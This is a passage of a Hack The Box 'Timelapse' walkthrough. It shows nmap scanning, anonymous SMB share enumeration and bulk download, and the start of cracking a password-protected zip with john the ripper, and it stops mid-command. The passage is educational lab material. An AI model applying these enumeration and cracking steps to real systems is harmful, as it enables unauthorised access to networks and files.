---
title: HTB Timelapse Walkthrough
url: https://www.secjuice.com/htb-timelapse-walkthrough/
source: Over Security - Cybersecurity news aggregator
date: 2024-06-10
fetch_date: 2025-10-06T16:55:24.352492
---

# HTB Timelapse Walkthrough

[![Secjuice](https://www.secjuice.com/content/images/2018/12/Logo-1.png)](https://www.secjuice.com)

* [Donate](https://opencollective.com/secjuice)
* [About Us](https://secjuice.com/about-us/)
* [Technical](https://secjuice.com/tag/technical/)
* [OSINT](https://secjuice.com/tag/OSINT/)
* [Unusual Journeys](https://secjuice.com/tag/unusual-journeys-into-infosec/)
* [HoF](https://secjuice.com/secjuice-hall-of-fame/)
* [Write With Us](https://secjuice.com/join-secjuice-writing-team/)
* [Hire A Writer](https://secjuice.com/hire-infosec-cybersecurity-writer/)
* [Rankings](https://secjuice.com/secjuice-writers-ranking/)

[Sign in](#/portal/signin)
[Subscribe](#/portal/signup)

# HTB Timelapse Walkthrough

I solved the hack-the-box for a Windows machine that was giving me problems. This is how I solved it to get the admin password.

* [![Andy74](/content/images/size/w100/2020/01/avatar.png)](/author/andy74/)

#### [Andy74](/author/andy74/)

Jun 9, 2024
• 20 min read

![HTB Timelapse Walkthrough](/content/images/size/w2000/2024/06/HTB-Timelapse-Walkthrough-1.png)

This AI-generated image was created using Microsoft Designer

I solved the hack-the-box for a Windows machine that was giving me some problems. Here is how I solved it to get the admin password.

This time the **nmap** scan does not give the desired results immediately.

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-15 21:58 CEST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.18 seconds
```

Then we proceed to force the scan even in the absence of the **ping** response (as suggested).

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-15 22:01 CEST
Nmap scan report for 10.10.11.152
Host is up (0.046s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-04-16 04:20:20Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h18m49s
| smb2-time:
|   date: 2022-04-16T04:20:24
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.76 seconds
```

There are many open ports, but the ones that immediately attracted my attention are those of the **SAMBA** protocol (this was to be expected in a windows machine), the ***445*** and the ***139***.

Before moving on to some more specific tools, let's try some simple *enumeration.* (I know I'll regret it and will have to retrace my steps).

```
┌──(in7rud3r㉿Mykali)-[~/Dropbox/hackthebox/_10.10.11.152 - Timelapse (win)]
└─$ smbclient -L \\\\10.10.11.152\\
Enter WORKGROUP\in7rud3r's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Shares          Disk
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Really? Shares?

Well, it would be a big mistake not to take a look.

```
┌──(in7rud3r㉿Mykali)-[~/Dropbox/hackthebox/_10.10.11.152 - Timelapse (win)]
└─$ smbclient \\\\10.10.11.152\\Shares
Enter WORKGROUP\in7rud3r's password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Oct 25 17:39:15 2021
  ..                                  D        0  Mon Oct 25 17:39:15 2021
  Dev                                 D        0  Mon Oct 25 21:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 17:48:42 2021

                6367231 blocks of size 4096. 1431852 blocks available
smb: \>
```

Let's go deeper!

```
smb: \> cd dev
smb: \dev\> dir
  .                                   D        0  Mon Oct 25 21:40:06 2021
  ..                                  D        0  Mon Oct 25 21:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 17:46:42 2021

                6367231 blocks of size 4096. 1431852 blocks available
smb: \dev\> cd ..
smb: \> cd helpdesk
smb: \helpdesk\> dir
  .                                   D        0  Mon Oct 25 17:48:42 2021
  ..                                  D        0  Mon Oct 25 17:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 16:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 16:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 16:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 16:57:44 2021

                6367231 blocks of size 4096. 1431852 blocks available
```

Let's take what we found and analyze it locally.

```
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \Dev\winrm_backup.zip of size 2611 as Dev/winrm_backup.zip (7.5 KiloBytes/sec) (average 7.5 KiloBytes/sec)
getting file \HelpDesk\LAPS.x64.msi of size 1118208 as HelpDesk/LAPS.x64.msi (1605.9 KiloBytes/sec) (average 1073.1 KiloBytes/sec)
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as HelpDesk/LAPS_Datasheet.docx (323.7 KiloBytes/sec) (average 896.3 KiloBytes/sec)
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as HelpDesk/LAPS_OperationsGuide.docx (1324.2 KiloBytes/sec) (average 1008.2 KiloBytes/sec)
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as HelpDesk/LAPS_TechnicalSpecification.docx (221.8 KiloBytes/sec) (average 890.0 KiloBytes/sec)
smb: \>
```

The content of the share appears to be part of the documentation and installation of the Microsoft "***Local Administrator Password Solution***" (**LAPS**) package and a zip file protected by a password. I have some doubts that it could be a modified version, so I decide to install it on a virtual machine and connect to the HTB VPN to try to reach the BOX and try some approaches.

![](https://www.secjuice.com/content/images/2022/05/img-00.png)

![](https://www.secjuice.com/content/images/2022/05/img-01.png)

![](https://www.secjuice.com/content/images/2022/05/img-02.png)

I tried connecting, but I get the message that no **LDAP** server is found, even though the port appears to be open. This is likely to be a simple clue left there to give some hints in the next steps.

Let's go ahead and try to open the password-protected compressed file. Below is a link to learn more.

[ZIP File Password Recovery Online | passwordrecovery.io

Learn how to crack a password protected ZIP file and try the process online with our Free tool.

![](https://passwordrecovery.io/static/images/apple-touch-icon.png)passwordrecovery.io

![](https://passwordrecovery.io/static/images/comparing-zip-hash-rates.webp)](https://passwordrecovery.io/zip-file-password-removal/?ref=secjuice.com)

We extracted the password hash from the zip file with the support tools of "**john the ripper**" and tried to crack it.

```
┌──(in7rud3r㉿Mykali)-[~/…/_10.10.11.152 - Timelapse (win)/attack/smb/Dev]
└─$ zip2john winrm_ba...